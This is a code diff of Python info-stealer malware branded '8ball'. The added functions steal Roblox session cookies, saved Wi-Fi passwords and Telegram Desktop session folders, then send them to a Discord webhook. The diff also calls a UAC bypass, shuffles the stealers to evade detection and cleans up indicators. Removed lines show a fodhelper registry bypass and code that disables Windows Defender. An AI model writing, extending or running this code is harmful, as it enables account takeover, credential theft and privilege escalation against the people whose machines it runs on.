+                desc = desc[:3997] + "..."
+        else:
+            desc = "No Roblox `.ROBLOSECURITY` tokens found."
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8ball — Roblox Cookies", "description": desc, "footer": {"text": "8ball"}}],
+            "username": "8ball",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        if cookies:
+            RX_DB6(f"[8Ball] Roblox cookies embed sent ({len(cookies)} found).")
+        else:
+            RX_DB6("[8Ball] Roblox cookies embed sent (none found).")
+    except Exception as e:
+        RX_DB6(f"[8Ball] roblox_cookies_func failed: {type(e).__name__}: {e}", "ERROR")
+
+# ── wifi_passwords ──
+def wifi_passwords_func():
+    if not FEATURE_CONFIG.get("wifi_passwords", False):
+        return
+    RX_DB6("[8Ball] wifi_passwords_func: starting")
+    try:
+        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
+        lines = []
+        for line in result.stdout.splitlines():
+            m = re.search(r":\s*(.+)$", line)
+            if m:
+                profile = m.group(1).strip()
+                r2 = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
+                pw = ""
+                for l2 in r2.stdout.splitlines():
+                    pm = re.search(r"Key Content\s*:\s*(.+)", l2)
+                    if pm:
+                        pw = pm.group(1).strip()
+                lines.append(f"SSID: {profile} | Password: {pw}")
+        if not lines:
+            RX_DB6("[8Ball] WiFi: no profiles found", "WARN")
+            return
+        text = "\n".join(lines)
+        path = rand_temp_file(".txt")
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(text)
+        link = UP104D7060F113(path)
+        try: os.remove(path)
+        except: pass
+        if not isinstance(link, str) or not link.startswith("http"):
+            link = "Upload failed"
+        desc = f"**{len(lines)}** Wi-Fi profiles extracted.\n[Download]({link})"
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8ball — Wi-Fi Passwords", "description": desc, "footer": {"text": "8ball"}}],
+            "username": "8ball",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        RX_DB6(f"[8Ball] WiFi passwords embed sent ({len(lines)} profiles).")
+    except Exception as e:
+        RX_DB6(f"[8Ball] wifi_passwords_func failed: {type(e).__name__}: {e}", "ERROR")
+
+# ── telegram_desktop ──
+def telegram_desktop_func():
+    if not FEATURE_CONFIG.get("telegram_desktop", False):
+        return
+    RX_DB6("[8Ball] telegram_desktop_func: starting")
+    try:
+        tdata = os.path.join(os.environ.get("APPDATA", ""), "Telegram Desktop", "tdata")
+        if not os.path.isdir(tdata):
+            RX_DB6("[8Ball] Telegram: tdata not found", "WARN")
+            return
+        zip_path = Z1PF01D3r("Telegram", tdata)
+        if not zip_path or not os.path.isfile(zip_path):
+            RX_DB6("[8Ball] Telegram: zip failed", "WARN")
+            return
+        link = ""
+        for i in range(3):
+            link = UP104D7060F113(zip_path)
+            if "https://" in str(link):
+                break
+            time.sleep(4)
+        try: os.remove(zip_path)
+        except: pass
+        if not isinstance(link, str) or not link.startswith("http"):
+            link = "Upload failed"
+        desc = f"Telegram Desktop `tdata` folder.\n[Download]({link})"
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8ball — Telegram Desktop", "description": desc, "footer": {"text": "8ball"}}],
+            "username": "8ball",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        RX_DB6("[8Ball] Telegram Desktop embed sent.")
+    except Exception as e:
+        RX_DB6(f"[8Ball] telegram_desktop_func failed: {type(e).__name__}: {e}", "ERROR")
 
 # Encrypt sensitive in-memory strings at rest
 def secure_store(key_name, value):
@@ -3059,79 +2989,22 @@ def secure_retrieve(key_name):
     except Exception:
         return ""
 
-# Elevate to admin if needed (fodhelper UAC bypass)
-if not ctypes.windll.shell32.IsUserAnAdmin():
-    if "--elevated" in sys.argv:
-        RX_DB6("Still not elevated, aborting.", "ERROR")
-        sys.exit(1)
-    ELEVATED_OUT = os.path.join(os.environ.get("TEMP", "."), "8Ball_elevated.txt")
-    import winreg as _wr
-    _REG = r"Software\Classes\ms-settings\shell\open\command"
-    _exe = os.path.abspath(sys.argv[0])
-    _cmd = f'"{_exe}" --elevated'
-    try:
-        _key = _wr.CreateKey(_wr.HKEY_CURRENT_USER, _REG)
-        _wr.SetValueEx(_key, "DelegateExecute", 0, _wr.REG_SZ, "")
-        _wr.SetValueEx(_key, None, 0, _wr.REG_SZ, _cmd)
-        _wr.CloseKey(_key)
-        subprocess.call([r"C:\Windows\System32\fodhelper.exe"], shell=True, creationflags=CREATE_NO_WINDOW)
-        time.sleep(5)
-        for _ in range(45):
-            if os.path.isfile(ELEVATED_OUT): break
-            time.sleep(1)
-        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
-        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
-        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings\\shell /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
-        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
-        if os.path.isfile(ELEVATED_OUT):
-            with open(ELEVATED_OUT, "r", encoding="utf-8", errors="replace") as _f:
-                sys.stdout.write(_f.read())
-            os.remove(ELEVATED_OUT)
-        sys.exit(0)
-    except Exception:
-        RX_DB6("Elevation failed, running without admin.", "WARN")
-
-disable_windows_security()
-if globals().get("_8BALL_EXECUTED"):
-    raise SystemExit(0)
-globals()["_8BALL_EXECUTED"] = True
-# Re-enable Defender realtime protection after 3 minutes
-def _re_enable_defender():
-    time.sleep(180)
-    enable_windows_security()
-threading.Thread(target=_re_enable_defender, daemon=True).start()
-random_delay(1.0, 4.0)
-
-fetch_thread = threading.Thread(target=fetch_and_run, daemon=True)
-fetch_thread.start()
-
-# Execute stealers with randomized order and jitter to evade detection
-shuffled_run([filestealr, G47H3r411, G37SYS1NF0, G37SCR3NSH0T, G37W3BC4M, G37R0BL0X, G37W1F1])
-
+# Elevate to admin via UAC bypass before any feature runs
+_uac_bypass()
 random_delay(0.5, 2.0)
 
-if FEATURE_CONFIG.get("discord_tokens", False) and not T0K3Ns:
-    send_confirmation_embed("8BALL | DH", "No Discord tokens found in browser or app storage.")
+# Execute stealers with randomized order and jitter to evade detection
+shuffled_run([
+    filestealr,
+    G47H3r411,
+    system_info_collect,
+    screenshot_capture_func,
+    webcam_capture_func,
+    roblox_cookies_func,
+    wifi_passwords_func,
+    telegram_desktop_func,
+])
 
-if FEATURE_CONFIG.get("discord_injection", False):
-    send_confirmation_embed("8BALL | DH", "Discord JavaScript injection feature executed.")
-
-if FEATURE_CONFIG.get("ip_location_info", False):
-    send_confirmation_embed("8BALL | DH", GLINFO)
-
-if FEATURE_CONFIG.get("system_info", False):
-    send_confirmation_embed("8BALL | DH", "PC hardware information collected.")
-if FEATURE_CONFIG.get("screenshot_capture", False):
-    send_confirmation_embed("8BALL | DH", "Desktop screenshot captured.")
-if FEATURE_CONFIG.get("webcam_capture", False):
-    send_confirmation_embed("8BALL | DH", "Webcam photo captured.")
-if FEATURE_CONFIG.get("roblox_cookies", False):
-    send_confirmation_embed("8BALL | DH", "Roblox cookie extraction completed.")
-if FEATURE_CONFIG.get("wifi_passwords", False):
-    send_confirmation_embed("8BALL | DH", "Wi-Fi password extraction completed.")
-
-cleanup_indicators()
-# Send debug log embed to Discord (only if debug_mode is enabled)
-send_debug_embed()
 random_delay(0.5, 1.5)
-enable_windows_security()
+cleanup_indicators()
+send_debug_embed()
